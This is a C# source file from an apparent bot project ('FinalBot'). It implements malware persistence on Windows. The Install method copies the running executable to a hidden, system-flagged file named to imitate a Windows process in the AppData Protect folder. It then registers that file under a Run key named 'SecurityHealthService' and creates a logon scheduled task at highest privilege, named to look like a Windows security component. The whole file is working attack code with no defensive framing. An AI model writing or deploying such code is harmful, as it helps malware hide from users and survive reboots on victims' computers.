using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using VanguardCore;

namespace FinalBot
{
    public static class Persistence
    {
        public static void Install()
        {
            try 
            {
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "Microsoft", "Protect");
                string targetPath = Path.Combine(targetDir, "RuntimeBrokerXX.exe");

                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                // 1. Copy to hidden location
                if (selfPath != targetPath)
                {
                    File.Copy(selfPath, targetPath, true);
                    File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                }

                // 2. Registry Run Key
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.SetValue("SecurityHealthService", $"\"{targetPath}\"");
                }

                // 3. Scheduled Task Persistence
                try
                {
                    var proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "schtasks",
                            Arguments = $"/create /tn \"SecurityHealthBrokerUpdater\" /tr \"'{targetPath}'\" /sc onlogon /rl highest /f",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };
                    proc.Start();
                }
                catch { }

                Logger.Info("[PERSISTENCE] Installed successfully via Registry and Schtasks.");
            }
            catch (Exception ex)
            {
                Logger.Error("Persistence installation failed", ex);
            }
        }

        public static void Uninstall()
        {
            try 
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.DeleteValue("SecurityHealthService", false);
                }
                
                // Cleanup logic here if needed
            }
            catch { }
        }
    }
}
